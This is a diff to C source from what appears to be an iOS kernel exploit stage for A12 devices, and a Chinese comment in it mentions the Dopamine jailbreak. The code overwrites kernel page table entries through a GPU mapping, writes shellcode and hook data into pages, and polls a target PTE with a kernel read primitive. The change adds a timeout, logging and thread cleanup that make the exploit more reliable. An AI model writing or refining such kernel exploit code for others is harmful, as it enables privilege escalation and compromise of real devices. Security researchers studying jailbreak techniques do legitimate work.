@@ -4,10 +4,12 @@
 
 static void *wait_for_pte(void *data) {
     uint32_t counter = 0;
+    // 对齐 Dopamine 触发路径，但加硬超时：失败时返回错误而不是永久卡死
+    const uint32_t timeout_ms = 20000;
     usleep(1000);
     
     uint32_t expected_val = (momentarius.gfx.method == 1) ? 0xd5381008 : 0xd538101d;
-    while (1) {
+    while (!stop_write) {
         if (counter > 1000 && kread64(momentarius.target_kern_addr) == momentarius.target_pte) {
             while(*(volatile uint32_t *)data != expected_val) {
                 *(volatile uint32_t *)data = expected_val;
@@ -15,13 +17,22 @@ static void *wait_for_pte(void *data) {
             }
             
             stop_write = true;
+            debug_log("wait_for_pte success at %u ms\n", counter);
             break;
         }
         
         usleep(1000);
-        if (++counter == 1000) {
+        ++counter;
+        if (counter == 1000 || (counter > 1000 && (counter % 2000) == 0)) {
             gfx_suspend();
             gfx_resume();
+        }
+        if (counter >= timeout_ms) {
+            debug_log("wait_for_pte TIMEOUT after %u ms (target_kern=%#llx target_pte=%#llx)\n",
+                      counter, momentarius.target_kern_addr, momentarius.target_pte);
+            momentarius_wait_failed = true;
+            stop_write = true;
+            break;
         }
     }
     return NULL;
@@ -188,10 +199,11 @@ int momentarius_init_A12(void) {
     
     if (gfx_gen_shellcode(pte_offset) != 0) return -1;
     pthread_t wait_thread = NULL;
+    momentarius_wait_failed = false;
+    stop_write = false;
     pthread_create(&wait_thread, NULL, wait_for_pte, (void *)(hook_page + hook_offset));
     
-    while (1) {
-        if (stop_write) break;
+    while (!stop_write) {
         *(volatile uint64_t*)(target_l3_table)                         = momentarius.gfx.text_pa | 0x403;  // map 0x0
         *(volatile uint64_t*)(target_l3_table + 0x3FF8)                = l3_table_pte_pa | 0x403;  // map magic page L3 to last ttbr0 VA 0x1FFC000
         *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset)          = *(uint64_t*)&momentarius.gfx.shc_data[0];
@@ -200,6 +212,12 @@ int momentarius_init_A12(void) {
         *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset + 0x18)   = *(uint64_t*)&momentarius.gfx.shc_data[6];
         *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset + 0x20)   = *(uint64_t*)&momentarius.gfx.shc_data[8];
         *(volatile uint32_t*)(hook_page + hook_offset)                 = momentarius.gfx.hook_data[0];
+    }
+    pthread_join(wait_thread, NULL);
+
+    if (momentarius_wait_failed) {
+        debug_log("momentarius_init_A12 failed: wait_for_pte timeout\n");
+        return -1;
     }
     
     momentarius.target_rw_pte = momentarius.self_ref_pt_kva + ((momentarius.target_rw_mapping >> 11) & 0x3FF8);
